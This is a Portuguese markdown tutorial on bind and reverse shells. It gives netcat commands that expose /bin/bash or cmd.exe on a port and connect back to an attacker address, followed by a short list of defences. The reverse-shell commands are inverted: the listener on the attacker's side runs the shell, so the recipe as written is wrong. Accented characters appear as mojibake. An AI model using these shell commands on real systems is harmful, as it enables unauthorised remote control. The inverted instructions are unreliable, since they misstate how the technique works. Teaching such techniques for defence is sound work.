# T√©cnicas: Bind Shell e Reverse Shell <br />

Objetivo: Executar comandos remotamente em um host afetado <br />
Cen√°rio: o Atacante j√° ganhou acesso a vitima e instalou o netcat para realizar as t√©cnicas.


## SHELL
O shell √© uma interface, em geral, em modo texto para executar comandos (CLI ‚Äì Command Line Interface) digitados pelo usu√°rio, situando-se entre o usu√°rio e o sistema operacional (Kernel).

## BIND SHELL
Nesta t√©cnica o atacante conecta-se a vitima que est√° preparada para receber conex√µes, permitindo ao atacante executar comandos como se estive localmente logado na vitima. Para a execu√ß√£o bem sucedida, alguns fatores como configura√ß√£o de firewall e tipo do IP (Publico ou Privado) devem ser considerados.

## REVERSE SHELL
Nesta t√©cnica a vitima conecta-se ao atacante que est√° preparado para receber conex√µes de uma forma especifica. Geralmente √© utilizada em casos onde a t√©cnica de BIND SHELL n√£o pode ser utilizada.

## NETCAT

O Netcat √© uma ferramenta de rede, dispon√≠vel para sistemas operacionais Unix, Linux, Microsoft Windows e Macintosh que permite, por interm√©dio de comandos e com sintaxe muito sens√≠vel, abrir portas TCP/UDP e HOST. Permite for√ßar conex√µes UDP/TCP (√∫til para realizar rastreamento de portas ou realizar transfer√™ncias de arquivos bit a bit entequipamentos). (Fonte: Wikipedia)

Usaremos o netcat para exemplicar o uso das t√©cnicas, lembrando-se que este n√£o √© √∫nico uso para o netcat tampouco esta √© √∫nica forma de executar as t√©cnicas


### Comandos para o Bind Shell

Vitima: (IP 192.168.0.100)
> nc -nvlp 9999 -e /bin/bash

Onde:
- nc = comando para executar o netcat no linux, no windows pode ser necessario utilizar (nc.exe)
- -n = N√£o pesquisa DNS ou servi√ßo em endere√ßos, nomes de host ou portas definidas.
- -v = Modo verbose, ou seja, mostra na tela as atividades executadas pelo comando (Opcional)
- -l = ativa o modo listen para permitir conex√µes externas
- -p = define o n√∫mero de uma porta aberta usada para conex√£o
- 9999 = porta de exemplo definada pelo parametro -p. Voc√™ pode escolher outras portas
- -e = define o shell a ser remotamente controlado
- /bin/bash = shell pra linux, para windows seria cmd.exe

Atacante:

Sintax: nc {IP} {porta}

Onde:
- nc = comando para executar o netcat
- {IP}  = Endere√ßo IP da vitima
- {porta} = Porta escolhida para conex√£o (dever√° ser a mesma definida no comando da vitima)

Exemplo
> nc 192.168.0.100 9999


### Comandos para o Reverse Shell

Atacante: (IP 192.168.0.110)
> nc.exe -nvlp 9999 -e cmd.exe (caso seja windows)

ou

> nc -nvlp 9999 -e /bin/bash (caso seja linux)

Vitima:
> nc 192.168.0.110 9999


### Importante
Lembre-se de preparar o host que recber√° a conex√£o primeiro üòâ

### Defenda-se üõ°Ô∏è
- Bind Shell: 
  - Tenha um firewall com regras de entrada restritas
  - Processos de NAT e PAT podem mudar o IP interno e at√© mesmo a porta
 
- Reverse Shell
  -  Proteja-se do acesso f√≠sico
  -  Firewall com filtragem de sa√≠da
  -  Feche portas n√£o utilizadas
  -  Utilize sistemas de detec√ß√£o NIDS ou HIDS


Saiba Mais:<br />
NetCat - https://www.devmedia.com.br/netcat-o-canivete-suico-tcp-ip-revista-infra-magazine-8/26299 <br/>
Outras t√©cnicas - [Dante Silva - WOMCY](https://github.com/dantesilva/curso-tecnicas-pentest)

